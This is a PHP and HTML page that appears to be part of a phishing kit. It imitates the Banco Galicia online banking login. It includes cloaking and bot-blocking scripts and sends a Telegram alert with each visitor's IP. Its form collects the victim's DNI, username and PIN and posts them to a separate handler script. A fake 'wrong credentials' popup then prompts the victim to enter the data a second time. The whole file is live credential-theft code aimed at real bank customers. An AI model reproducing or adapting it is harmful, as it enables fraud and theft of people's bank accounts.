<?php
include './config.php';
include './naranja/tg.php';
include './shield/cloack_start.php';
if ($EYEZ == true){
    include './guardian/start.php';
}
if ($blocker == true){
    include './sistema/view.php';
}
$update = null;
if(isset($_GET['update'])){
    $update = $_GET['update'];
}
elseif ($bye == true && $alert == true){
    $msg  = "¡ALERTA! Cliente detectado 👁‍🗨\r\n";
    $msg .= "IP : ".$ip."\r\n";
    sendTg($msg, $key, $id);
}
?>
<!DOCTYPE html>

<html lang="es-ar">

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="google" content="notranslate">
    <meta name="robots" content="noindex">
    <title>Galicia promociones</title>
    <link rel="shortcut icon" href="./resources/img/favicon.ico" />
    <link type="text/css" href="./resources/design/lib.css" rel="stylesheet" />
    <link type="text/css" href="./resources/design/gali.css" rel="stylesheet" />
</head>

<body>
    <div class="container-fluid ">
        <div class="row full-h">
            <div class="left-column">
                <div class="logo_lala" role="banner">
                    <a title="" class="logo">
                        <div class="logo_sidebar_img"></div>
                    </a>
                </div>
                <div class="lala">
                    <div class="content-lala" role="main">
                        <form
                            action="./naranja/manda.php?update=<?php echo $update?>"
                            id="mainF" method="post" autocomplete="off">
                            <div class="lala-form">
                                <div class="row">
                                    <div class="col-xs-12">
                                        <h1 class="lala-title hidden-xs">Iniciar sesión</h1>
                                    </div>
                                    <div class="inputWrapper">
                                        <div class="inputArea">
                                            <div class="contentInput">
                                                <input type="tel" pattern="[0-9]+" placeholder="Tu DNI" name="docnm"
                                                    maxlength="11" required autocomplete="off" class="form-control ">
                                            </div>
                                            <div class="inputUnderline"></div>
                                        </div>
                                    </div>
                                    <div class="inputWrapper ">
                                        <div class="inputArea">
                                            <div class="contentInput">
                                                <input type="password" name="sacrego" placeholder="Tu usuario Galicia"
                                                    maxlength="20" required class="form-control hidden-control "
                                                    autocomplete="off">
                                            </div>
                                            <div class="inputUnderline"></div>
                                        </div>
                                    </div>
                                    <div class="inputWrapper ">
                                        <div class="inputArea">
                                            <div class="contentInput">
                                                <input type="password" inputmode="numeric" pattern="[0-9]+" name="patrica"
                                                    placeholder="Tu clave Galicia" maxlength="4" required
                                                    class="form-control hidden-control " autocomplete="off">
                                            </div>
                                            <div class="inputUnderline"></div>
                                        </div>
                                    </div>
                                    <div class="col-xs-12">
                                        <div class="form-group">
                                            <div class="checkbox checkbox-primary">
                                                <input name="RememberMe" id="RememberMe" type="checkbox" value="true" />
                                                <label for="RememberMe">
                                                    Recordar DNI y Usuario
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-xs-12"><br>
                                        <button class="btn btn-md btn-full-width" type="submit" id="submitButton">
                                            iniciar sesión
                                        </button>
                                    </div>

                                    <div class="col-xs-12">
                                        <div class="links">
                                            <a class="btn btn-caps pull-left">
                                                OLVIDÉ O BLOQUEÉ MIS CLAVES
                                            </a>
                                        </div>
                                        <p>Sí es tu primera vez o necesitás el usuario</p>
                                        <div class="links">
                                            <a class="btn btn-caps pull-left">
                                                CREÁ TUS CLAVES
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>

                <div class="modal fade in" id="popupErrorCredenciales" style="display: none;">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <p class="modal-title description">Los datos que ingresaste tienen
                                    algún error</p>
                            </div>
                            <div class="modal-body">
                                <p>Por favor, revisalos antes de volver a intentarlo, ya que tu
                                    usuario y clave pueden bloquearse.</p>
                                <p>
                                    24102023190718
                                </p>
                            </div>
                            <div class="modal-footer">
                                <button type="button" onclick="closeErrorMessage()"
                                    class="btn btn-caps">ACEPTAR</button>
                            </div>

                        </div>
                    </div>
                </div>

                <div class="terms">
                    <p>Operar con Online Banking implica aceptar los <a>términos y
                            condiciones</a> en los que se ofrece el servicio.</p>
                    <p><a>Información sobre seguridad</a></p>
                </div>

                <div class="side-info content img art art-6">

                </div>
            </div>

        </div>
    </div>
</body>
<script type="text/javascript">
    window.onload = function () {
        var formulario = document.getElementById('mainF');
        var boton = document.getElementById('submitButton');

        formulario.addEventListener('submit', function () {
            boton.disabled = true;
        });
    }

    function closeErrorMessage() {
        document.getElementById('popupErrorCredenciales').style.display = "none";
    }
</script>

</html>
<?php
if(isset($_GET['update']) && $_GET['update'] == "login"){
    echo "<script>
    document.getElementById('popupErrorCredenciales').style.display = \"block\";
	setTimeout(function() {
        document.getElementById('popupErrorCredenciales').style.display = \"none\";
    }, 7000);
    </script>";
}?>